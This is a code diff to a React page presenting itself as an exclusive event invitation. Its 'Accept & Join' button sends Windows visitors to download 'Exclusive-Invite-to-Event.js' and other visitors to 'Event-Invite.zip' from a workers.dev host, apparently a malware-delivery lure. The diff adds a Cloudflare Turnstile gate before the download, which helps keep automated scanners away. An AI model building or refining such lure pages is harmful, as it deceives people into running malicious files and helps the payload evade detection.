@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
 import './App.css';
 
 export default function App() {
@@ -23,20 +23,62 @@ export default function App() {
   return <Invite />;
 }
 
-function Invite() {
-  const handleDownload = () => {
-    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
+// Replace with your Cloudflare Turnstile site key from dash.cloudflare.com
+const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PFOyWG2itBdMi';
 
+function Invite() {
+  const [verified, setVerified] = useState(false);
+  const turnstileRef = useRef(null);
+  const widgetIdRef = useRef(null);
+
+  const handleDownload = () => {
+    if (!verified) return;
+    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
     if (isWindows)
     {
-      // Replace with your Windows download URL
       window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Exclusive-Invite-to-Event.js';
     } else
     {
-      // Replace with your Mac download URL
       window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Event-Invite.zip';
     }
   };
+
+  const onTurnstileSuccess = useCallback((token) => {
+    if (token) setVerified(true);
+  }, []);
+
+  const onTurnstileExpired = useCallback(() => {
+    setVerified(false);
+  }, []);
+
+  useEffect(() => {
+    const renderWidget = () => {
+      if (!turnstileRef.current || !window.turnstile) return;
+      if (widgetIdRef.current !== null) return;
+      widgetIdRef.current = window.turnstile.render(turnstileRef.current, {
+        sitekey: TURNSTILE_SITE_KEY,
+        callback: onTurnstileSuccess,
+        'expired-callback': onTurnstileExpired,
+        theme: 'light',
+      });
+    };
+
+    if (window.turnstile)
+    {
+      renderWidget();
+    } else
+    {
+      // Turnstile script may still be loading
+      const interval = setInterval(() => {
+        if (window.turnstile)
+        {
+          clearInterval(interval);
+          renderWidget();
+        }
+      }, 100);
+      return () => clearInterval(interval);
+    }
+  }, [onTurnstileSuccess, onTurnstileExpired]);
 
   return (
     <>
@@ -63,7 +105,13 @@ function Invite() {
               <span className="highlight">Please accept this invitation and be part of something special.</span>
             </p>
 
-            <button className="accept-btn" onClick={handleDownload}>
+            <div ref={turnstileRef} className="turnstile-widget"></div>
+
+            <button
+              className={`accept-btn${!verified ? ' accept-btn--disabled' : ''}`}
+              onClick={handleDownload}
+              disabled={!verified}
+            >
               Accept & Join
             </button>
           </div>
